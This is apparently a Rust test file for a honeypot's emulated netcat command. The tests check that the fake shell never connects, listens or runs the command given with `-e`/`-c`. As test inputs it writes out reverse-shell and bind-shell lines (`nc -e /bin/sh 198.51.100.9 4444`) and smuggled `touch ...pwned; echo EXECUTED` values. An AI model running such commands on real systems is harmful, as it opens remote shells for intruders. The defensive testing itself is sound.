//! `nc` through `handle_input`, the way a session reaches it. The command only captures intent:
//! these pin the replies on the persona that has `nc`, the not-found on the one that does not,
//! and the two guarantees that matter most, that nothing connects and that an `-e`/`-c` command
//! never runs. The wording is OpenBSD netcat's as remembered, not captured, so the cases that pin
//! a line say so.

use chrono::{DateTime, TimeZone, Utc};

use super::{CommandResult, EmitContext, FakeShell, HandlerId, OutputFd};
use crate::fakefs::FakeFs;

fn ctx() -> EmitContext {
    EmitContext {
        source_ip: "203.0.113.77".parse().unwrap(),
        wan_ip: Some("198.51.100.88".parse().unwrap()),
        authenticated: true,
        protocol_label: "ssh".to_string(),
        session_id: None,
    }
}

fn friday() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 10, 2, 12, 34, 56).unwrap()
}

fn ubuntu() -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx()).with_clock(friday)
}

fn phone() -> FakeShell {
    FakeShell::android(FakeFs::android(), ctx()).with_clock(friday)
}

fn stream(out: &CommandResult, fd: OutputFd) -> String {
    let bytes: Vec<u8> = out
        .output
        .iter()
        .filter(|segment| segment.fd == fd)
        .flat_map(|segment| segment.bytes.iter().copied())
        .collect();
    String::from_utf8(bytes).unwrap()
}

/// `(stdout, stderr, status)` of one line.
fn answer(sh: &mut FakeShell, line: &str) -> (String, String, u8) {
    let out = sh.handle_input(line).0;
    (
        stream(&out, OutputFd::Stdout),
        stream(&out, OutputFd::Stderr),
        out.status,
    )
}

fn silent(status: u8) -> (String, String, u8) {
    (String::new(), String::new(), status)
}

fn refused(host: &str, port: u16) -> (String, String, u8) {
    (
        String::new(),
        format!("nc: connect to {host} port {port} (tcp) failed: Connection refused\n"),
        1,
    )
}

/// Everything a session can observe about the box's state: the process table and the tree. The
/// row of the `ps` that reads the table is left out, because its pid advances with every command.
fn world(sh: &mut FakeShell) -> (String, String) {
    let table: String = answer(sh, "ps")
        .0
        .lines()
        .filter(|row| row.split_whitespace().last() != Some("ps"))
        .map(|row| format!("{row}\n"))
        .collect();
    (table, answer(sh, "find / 2>/dev/null").0)
}

#[test]
fn a_connect_does_not_come_up_and_is_silent_without_verbose() {
    let mut sh = phone();
    assert_eq!(answer(&mut sh, "nc host 4444"), silent(1));
    assert_eq!(answer(&mut sh, "nc 198.51.100.9 4444"), silent(1));
}

#[test]
fn a_verbose_connect_is_refused_and_a_timeout_names_the_timeout() {
    let mut sh = phone();
    assert_eq!(answer(&mut sh, "nc -v host 4444"), refused("host", 4444));
    assert_eq!(answer(&mut sh, "nc -vv host 4444"), refused("host", 4444));
    let (out, err, status) = answer(&mut sh, "nc -v -w 3 host 4444");
    assert_eq!((out.as_str(), status), ("", 1));
    assert_eq!(
        err,
        "nc: connect to host port 4444 (tcp) timed out: Operation now in progress\n"
    );
    // The timeout is modeled: the reply is immediate and carries no duration.
    assert!(!err.contains('3'));
}

#[test]
fn the_reverse_shell_form_connects_to_nothing_and_says_the_same() {
    let mut sh = phone();
    assert_eq!(
        answer(&mut sh, "nc -e /bin/sh 198.51.100.9 4444"),
        silent(1)
    );
    assert_eq!(
        answer(&mut sh, "nc -v -e /bin/sh 198.51.100.9 4444"),
        refused("198.51.100.9", 4444)
    );
    // `-c`, the other exec spelling, and an attached value.
    assert_eq!(
        answer(&mut sh, "nc -c /bin/sh 198.51.100.9 4444"),
        silent(1)
    );
    assert_eq!(
        answer(&mut sh, "nc -ve/bin/sh 198.51.100.9 4444"),
        refused("198.51.100.9", 4444)
    );
}

#[test]
fn a_udp_connect_has_no_handshake_to_fail() {
    let mut sh = phone();
    assert_eq!(answer(&mut sh, "nc -u host 53"), silent(0));
}

#[test]
fn listen_returns_without_binding_when_a_port_was_given() {
    let mut sh = phone();
    assert_eq!(answer(&mut sh, "nc -l -p 1337"), silent(0));
    assert_eq!(answer(&mut sh, "nc -lvp 1337"), silent(0));
    assert_eq!(answer(&mut sh, "nc -lp1337"), silent(0));
    assert_eq!(answer(&mut sh, "nc -l 1337"), silent(0));
    assert_eq!(answer(&mut sh, "nc -l -p 1337 -e /bin/sh"), silent(0));
    // No port to listen on is an error the model does not word: silent, nonzero.
    assert_eq!(answer(&mut sh, "nc -l"), silent(1));
    assert_eq!(answer(&mut sh, "nc -l -p notaport"), silent(1));
    // A listener is not a process of the model, and nothing can connect to it.
    assert!(!answer(&mut sh, "ps").0.contains("nc"));
    assert!(!answer(&mut sh, "netstat").0.contains("1337"));
}

#[test]
fn a_scan_reports_every_named_port_closed() {
    let mut sh = phone();
    assert_eq!(answer(&mut sh, "nc -zv host 22"), refused("host", 22));
    assert_eq!(answer(&mut sh, "nc -z host 22"), silent(1));
    let (_, err, status) = answer(&mut sh, "nc -zv host 20-22 80");
    assert_eq!(status, 1);
    assert_eq!(
        err.lines().collect::<Vec<_>>(),
        [
            "nc: connect to host port 20 (tcp) failed: Connection refused",
            "nc: connect to host port 21 (tcp) failed: Connection refused",
            "nc: connect to host port 22 (tcp) failed: Connection refused",
            "nc: connect to host port 80 (tcp) failed: Connection refused",
        ]
    );
}

#[test]
fn a_plain_connect_uses_the_first_port_only() {
    let mut sh = phone();
    assert_eq!(answer(&mut sh, "nc -v host 22 80"), refused("host", 22));
}

#[test]
fn unusable_operands_are_silent_failures() {
    let mut sh = phone();
    for line in [
        "nc",
        "nc host",
        "nc host notaport",
        "nc host 0",
        "nc host 65536",
        "nc host 30-20",
    ] {
        assert_eq!(answer(&mut sh, line), silent(1), "{line}");
    }
    // A flag nobody modeled is accepted and ignored.
    assert_eq!(answer(&mut sh, "nc -Q -v host 80"), refused("host", 80));
}

#[test]
fn nc_leaves_the_process_table_and_the_tree_unchanged() {
    for mut sh in [phone()] {
        let before = world(&mut sh);
        for line in [
            "nc host 4444",
            "nc -e /bin/sh 198.51.100.9 4444",
            "nc -l -p 1337",
            "nc -zv host 22",
            "nc -v -e '/bin/sh -i' host 1 > /dev/null",
        ] {
            answer(&mut sh, line);
        }
        assert_eq!(world(&mut sh), before);
    }
}

/// Ubuntu 22.04 has no `/usr/bin/nc` and no `netcat` (binaries table, 2026-09-29), so the bare
/// name is not found and `command -v` agrees.
#[test]
fn ubuntu_has_no_bare_nc_netcat_or_ncat() {
    let mut sh = ubuntu();
    for name in ["nc", "netcat", "ncat"] {
        let (out, err, status) = answer(&mut sh, &format!("{name} -e /bin/sh 198.51.100.9 4444"));
        assert_eq!((out.as_str(), status), ("", 127), "{name}");
        assert!(err.contains("not found"), "{name}: {err}");
        assert_eq!(
            answer(&mut sh, &format!("command -v {name}")).2,
            1,
            "{name}"
        );
        assert_eq!(answer(&mut sh, &format!("which {name}")).2, 1, "{name}");
        assert_eq!(answer(&mut sh, &format!("type {name}")).2, 1, "{name}");
    }
    assert_eq!(answer(&mut sh, "ls /usr/bin/nc /bin/nc").2, 2);
}

/// The recorded BusyBox applet list names `nc`, so `busybox nc` runs the model on Ubuntu even
/// though the bare name does not.
#[test]
fn busybox_nc_runs_on_ubuntu_and_the_bare_name_still_does_not() {
    let mut sh = ubuntu();
    assert_eq!(
        answer(&mut sh, "busybox nc -v host 4444"),
        refused("host", 4444)
    );
    assert_eq!(
        answer(&mut sh, "/bin/busybox nc -e /bin/sh host 4444"),
        silent(1)
    );
    assert_eq!(answer(&mut sh, "busybox nc -l -p 1337"), silent(0));
    assert_eq!(answer(&mut sh, "nc host 4444").2, 127);
    // The applet depth does not leak out of the call.
    assert_eq!(answer(&mut sh, "nc -v host 4444").2, 127);
    // `busybox netcat` is no applet of the recorded list.
    assert_eq!(
        answer(&mut sh, "busybox netcat host 1"),
        ("".into(), "netcat: applet not found\n".into(), 127)
    );
}

#[test]
fn nc_on_the_phone_is_a_file_toybox_and_busybox_route_to() {
    let mut sh = phone();
    assert!(
        answer(&mut sh, "command -v nc")
            .0
            .contains("/system/bin/nc")
    );
    assert!(
        answer(&mut sh, "ls /system/bin")
            .0
            .split_whitespace()
            .any(|n| n == "nc")
    );
    assert_eq!(answer(&mut sh, "stat /system/bin/nc").2, 0);
    assert_eq!(
        answer(&mut sh, "/system/bin/nc -v host 80"),
        refused("host", 80)
    );
    assert_eq!(answer(&mut sh, "toybox nc -v host 80"), refused("host", 80));
    assert_eq!(
        answer(&mut sh, "busybox nc -v host 80"),
        refused("host", 80)
    );
    assert!(answer(&mut sh, "toybox").0.lines().any(|n| n == "nc"));
    for name in ["netcat", "ncat"] {
        assert_eq!(answer(&mut sh, name).2, 127, "{name}");
    }
}

#[test]
fn the_trace_records_the_decision_and_no_reentry() {
    let mut sh = phone();
    answer(&mut sh, "nc -e '/system/bin/sh -i' 198.51.100.9 4444");
    let trace = sh.last_trace();
    let command = trace.segments[0].command.as_ref().unwrap();
    assert_eq!(command.resolved, HandlerId::Nc);
    assert_eq!(command.status, 1);
    // The `-e` command is data: it was never dispatched, so nothing ran inside nc.
    assert!(command.reentry.is_empty());
    assert!(command.fs_effects.is_empty());
}

/// NEVER-EXEC. The `-e`/`-c` text names a command that would create a file, print a marker and
/// start a process. None of that happens: no file, no marker, no re-entry, no process row.
#[test]
fn the_exec_command_is_never_run() {
    for mut sh in [phone()] {
        let before = world(&mut sh);
        for line in [
            "nc -e 'touch /data/local/tmp/pwned' 198.51.100.9 4444",
            "nc -c 'touch /data/local/tmp/pwned2; echo EXECUTED' 198.51.100.9 4444",
            "nc -v -e 'echo EXECUTED > /data/local/tmp/pwned3' host 4444",
            "nc -l -p 1337 -e '/system/bin/sh -c \"touch /data/local/tmp/pwned4\"'",
        ] {
            let (out, err, _) = answer(&mut sh, line);
            assert!(
                !out.contains("EXECUTED") && !err.contains("EXECUTED"),
                "{line}"
            );
            assert!(!err.contains("touch") && !err.contains("pwned"), "{line}");
            let trace = sh.last_trace();
            let command = trace.segments[0].command.as_ref().unwrap();
            assert_eq!(command.resolved, HandlerId::Nc, "{line}");
            assert!(command.reentry.is_empty(), "{line}");
            assert!(command.fs_effects.is_empty(), "{line}");
        }
        assert_eq!(answer(&mut sh, "ls /data/local/tmp"), silent(0));
        for file in ["pwned", "pwned2", "pwned3", "pwned4"] {
            assert_ne!(
                answer(&mut sh, &format!("cat /data/local/tmp/{file}")).2,
                0,
                "{file} was created"
            );
        }
        assert_eq!(world(&mut sh), before);
        // The check can fail: the same `touch`, run directly, is visible to it.
        answer(&mut sh, "touch /data/local/tmp/pwned");
        assert_eq!(answer(&mut sh, "ls /data/local/tmp").0, "pwned\n");
    }
    // Under busybox on Ubuntu too, and behind a `;` the exec value cannot smuggle a second command.
    let mut sh = ubuntu();
    let before = world(&mut sh);
    let (out, _, _) = answer(
        &mut sh,
        "busybox nc -e 'touch /tmp/pwned; echo EXECUTED' host 4444",
    );
    assert!(!out.contains("EXECUTED"));
    assert_eq!(answer(&mut sh, "ls /tmp/pwned").2, 2);
    assert_eq!(world(&mut sh), before);
}

#[test]
fn captured_fields_are_length_bounded_and_the_command_is_not_echoed() {
    let mut sh = phone();
    let host = "h".repeat(5_000);
    let command = "c".repeat(5_000);
    let (_, err, status) = answer(&mut sh, &format!("nc -zv -e {command} {host} 1-65535"));
    assert_eq!(status, 1);
    assert!(!err.contains("cccc"));
    // At most 16 ports, each line carrying at most 253 host bytes.
    assert_eq!(err.lines().count(), 16);
    assert!(err.len() < 16 * (253 + 64), "{} bytes", err.len());
    assert!(err.lines().all(|l| l.matches('h').count() <= 253 + 1));
    // A port token past the width is not a port.
    assert_eq!(
        answer(&mut sh, "nc -v host 11111111111-22222222222"),
        silent(1)
    );
    // Control bytes in a host are not repeated.
    let (_, err, _) = answer(&mut sh, "nc -v $'a\\x1bb' 80");
    assert!(!err.contains('\u{1b}'));
}

#[test]
fn a_peer_or_deployment_address_never_reaches_a_reply() {
    let mut sh = phone();
    for line in [
        "nc -v host 80",
        "nc -zv host 20-30",
        "nc -l -p 1",
        "nc -u host 53",
    ] {
        let (out, err, _) = answer(&mut sh, line);
        for secret in ["203.0.113.77", "198.51.100.88"] {
            assert!(!out.contains(secret) && !err.contains(secret), "{line}");
        }
    }
}

/// NEVER-CONNECT. The module names no socket, resolver, process or filesystem facility.
#[test]
fn the_module_never_touches_the_network_a_process_or_the_host() {
    let source = include_str!("netcat.rs");
    // Built by concatenation so this file does not trip the shell tree's own source scan.
    let spawn = ["Command", "::new"].concat();
    for banned in [
        "std::net",
        "std::fs",
        "std::process",
        "std::env",
        "std::os",
        "TcpStream",
        "TcpListener",
        "UdpSocket",
        "ToSocketAddrs",
        "IpAddr",
        spawn.as_str(),
        "tokio",
        "libc",
        "socket",
        "source_ip",
        "wan_ip",
        "self.ctx",
        "dispatch",
        "self.fs",
    ] {
        // The module doc names sockets to say it opens none; code lines may not.
        let in_code = source
            .lines()
            .filter(|line| !line.trim_start().starts_with("//"))
            .any(|line| line.contains(banned));
        assert!(!in_code, "netcat.rs mentions {banned}");
    }
}
